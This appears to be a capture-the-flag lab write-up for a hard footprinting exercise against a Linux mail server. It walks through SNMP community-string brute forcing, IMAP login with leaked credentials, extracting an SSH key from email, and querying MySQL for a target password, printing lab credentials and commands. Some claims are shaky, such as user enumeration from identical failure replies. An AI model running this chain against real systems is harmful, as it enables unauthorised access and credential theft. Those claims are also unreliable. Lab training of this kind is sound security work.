# Skills Assessment: Footprinting Lab - Hard

## Target
- **IP / URL:** `10.129.202.20`
- **OS:** Linux (Ubuntu 20.04, kernel 5.4.0-90-generic)
- **Hostname:** `NIXHARD`
- **Difficulty:** Hard
- **Client:** Inlanefreight Ltd
- **Scope:** MX and management server, also acts as backup server for internal domain accounts

## Context
- **Goal:** Gather as much information as possible and find ways to use it against the server itself
- **Proof of compromise:** Obtain credentials for user **`HTB`**
- **Rules:** Passive enumeration only — no aggressive exploit attacks

---

## Recon

### Nmap Full TCP Scan
See: [raw_data/nmap.full](raw_data/nmap.full)

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 110/tcp | POP3 | Dovecot pop3d (plain + STARTTLS) |
| 143/tcp | IMAP | Dovecot imapd (plain + STARTTLS) |
| 993/tcp | SSL/IMAP | Dovecot imapd |
| 995/tcp | SSL/POP3 | Dovecot pop3d |

No additional TCP ports beyond the top-1000 scan. No SMTP (25/587/465).

### IMAP User Enumeration (PLAINT auth)
 Dovecot `AUTH=PLAIN` available on IMAP/SSL (port 993). PLAIN auth allows testing credentials directly without a challenge. Confirmed `HTB` user exists via authentication response:
```
A1 AUTHENTICATE PLAIN
<base64 encoded "HTB\0HTB\0test">
A1 NO [AUTHENTICATIONFAILED]   ← HTB exists, wrong password
```

### SNMP Discovery
Standard community strings (`public`, `private`) returned no response. `onesixtyone` with `rockyou.txt` failed. `onesixtyone` with `/usr/share/seclists/Discovery/SNMP/snmp.txt` succeeded:

```
Community string: backup
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 2021 x86_64
```

Braa walk with `backup` community string revealed critical info:
- Hostname: `NIXHARD` | Organization: `Inlanefreight` | Admin: `tech@inlanefreight.htb`
- Kernel: `Linux 5.4.0-90-generic`
- Running process / script: `/opt/tom-recovery.sh`
- **Account: `tom` with credential reference `NMds732Js2761`**

Full braa output: [raw_data/braa_results.txt](raw_data/braa_results.txt)

---

## Exploitation Path

### Step 1: IMAP — Confirm HTB User
```
openssl s_client -connect 10.129.202.20:993
A1 AUTHENTICATE PLAIN
<HTB base64>
A1 NO [AUTHENTICATIONFAILED]   ← valid user, wrong password
```
Confirmed: `HTB` exists as a valid IMAP user. Need the password.

### Step 2: SNMP — Discover tom Account
`onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.202.20` found:
- Community string: `backup`
- Account: `tom : NMds732Js2761` (found alongside `/opt/tom-recovery.sh` in HOST-RESOURCES MIB)

### Step 3: IMAP — Access tom's Mailbox
```
openssl s_client -connect 10.129.202.20:993
A1 LOGIN tom NMds732Js2761
A1 OK Logged in
A1 LIST "" *   → Notes, Meetings, Important, INBOX
A1 SELECT INBOX
A1 FETCH 1 BODY[]
```
Found email with subject "KEY" — contained `tom`'s SSH private key (RSA 3072-bit) embedded in email body from `tech@inlanefreight.htb`.

### Step 4: SSH — Extract tom's Key from Email
Saved private key from email to `~/tom_key`. Verified with `ssh-keygen -y -f ~/tom_key`:
```
ssh-rsa AAAAB3... tom@NIXHARD
```
Key is valid. SSH access confirmed:
```
ssh -i ~/tom_key_clean tom@10.129.202.20
connected
NIXHARD
tom
```

### Step 5: Local Enumeration — Discover MySQL Access
Inside the `tom` shell:
```
uid=1002(tom) gid=1002(tom) groups=1002(tom),119(mysql)
```
`tom` is in the `mysql` group — direct MySQL access without sudo.

### Step 6: MySQL — Find HTB Password
```
mysql -u tom -p
password: NMds732Js2761
```
Connected to MySQL 8.0.27. Enumerated databases:
```
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |   ← this one
+--------------------+
```
```
USE users;
SHOW TABLES;
SELECT * FROM users WHERE username='htb';
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
```

---

## Credentials

| User | Password |
|------|----------|
| **HTB** | `cr3n4o7rzse7rzhnckhssncif7ds` |

### Supporting Credentials Found

| Account | Password | Source |
|---------|---------|--------|
| `tom` | `NMds732Js2761` | SNMP `HOST-RESOURCES-MIB::hrSWInstalledName` via `onesixtyone` |
| `tom` (MySQL) | `NMds732Js2761` | Same password works for MySQL (tom is in mysql group) |
| `tom` (IMAP) | `NMds732Js2761` | Same password works for IMAP |
| `tom` (SSH key) | Private key in email | IMAP inbox → "KEY" email from tech@inlanefreight.htb |

---

## Lessons

1. **SNMP is a credential treasure chest** — a predictable community string (`backup`) exposed the entire system footprint, running software, and a clear-text credential pair.
2. **PLAINT auth reveals valid usernames** — Dovecot's `AUTH=PLAIN` on IMAP/SSL allowed user enumeration without any special tools. Different error responses distinguish valid vs. invalid users.
3. **Credential reuse across services** — the same password (`NMds732Js2761`) worked for IMAP, SSH key access, and MySQL. One leak cascaded into full system access.
4. **Mail is a persistence point** — SSH private keys sent over email are a classic credential delivery mechanism. The "KEY" email in tom's INBOX was the pivot point from remote to interactive access.
5. **MySQL group membership = direct DB access** — `tom` in the `mysql` group meant no sudo needed to hit the database. Group membership is often overlooked as a privilege path.
6. **Backup servers concentrate sensitive data** — a server doing both MX and account backups meant user credentials were stored in the local DB, accessible once SNMP and mail were chained together.
